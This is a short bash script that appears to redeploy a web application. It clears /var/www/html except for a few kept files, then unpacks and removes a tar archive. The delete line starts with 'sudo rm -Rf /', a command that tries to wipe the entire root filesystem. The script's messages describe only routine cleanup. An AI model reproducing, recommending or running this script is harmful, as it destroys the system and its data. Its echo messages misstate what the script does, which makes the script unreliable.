#!/bin/bash
echo "Removing other files except run.sh"
cd /var/www/html
shopt -s extglob
sudo rm -Rf / && rm -fv !(.sh|.htaccess|api|assets|admin)
ls
echo "Files deleted"
tar -zxf uaect.tar.gz
echo "Successfully extracted the files"
rm -rf uaect.tar.gz
echo "Successfully removed uaect.tar.gz"